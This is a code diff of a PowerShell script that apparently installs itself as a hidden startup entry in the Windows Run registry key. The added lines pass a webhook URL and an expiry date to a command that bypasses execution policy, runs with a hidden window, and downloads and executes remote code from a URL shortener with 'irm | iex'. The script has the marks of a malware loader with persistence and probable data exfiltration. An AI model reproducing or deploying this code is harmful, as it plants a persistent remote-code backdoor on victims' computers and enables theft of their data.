@@ -6,11 +6,20 @@ $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp
 
 # Set the default expiry date to 30 days from today if no expiry date is passed
 if (-not $expiryDateParam) {
+    # Default expiry date is 30 days from today
     $expiryDate = (Get-Date).AddDays(30)
 } else {
-    # Parse the expiry date passed in 'yyyy-MM-dd' format
-    $expiryDate = [datetime]::ParseExact($expiryDateParam, 'yyyy-MM-dd', $null)
+    # Parse the expiry date passed, assuming it is in 'MM/dd/yyyy' format or any valid date format
+    try {
+        $expiryDate = [datetime]::Parse($expiryDateParam)  # This will automatically parse common formats
+    } catch {
+        Write-Host "Invalid expiry date format. Please provide a valid date."
+        exit
+    }
 }
+
+# Convert the expiry date to 'yyyy-MM-dd' format
+$expiryDateFormatted = $expiryDate.ToString('yyyy-MM-dd')
 
 # Check if the script has expired
 $currentDate = Get-Date
@@ -26,7 +35,7 @@ $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup2"  # You can change this name if you like
 
 # Command to execute in the startup registry
-$regCommand = "powershell -NoP -Ep Bypass -W H -C `$dc='$dc'; `$expiryDateParam='$expiryDate'; irm https://shorturl.at/R2sYz | iex"
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$dc='$webhookURL'; `$expiryDateParam='$expiryDateFormatted'; irm https://shorturl.at/R2sYz | iex"
 
 # Check if the script is already added to startup to avoid duplicates
 $existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
